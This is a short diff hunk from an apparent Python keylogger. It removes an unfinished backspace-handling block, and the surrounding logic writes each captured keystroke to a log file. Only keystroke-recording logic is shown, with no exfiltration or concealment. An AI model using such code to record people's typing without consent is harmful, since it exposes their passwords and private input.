@@ -32,12 +32,6 @@ def write_file(keys):
             if key == Key.enter:
                 f.write("\n")
                 continue
-
-            #Todo implement backspace functionality
-            if key == Key.backspace:
-                with open(filename, 'r') as file:
-                    contents = file.read()
-                    print(contents)
             # Write the key to the file followed by a space
             f.write(k)
             #f.write('')
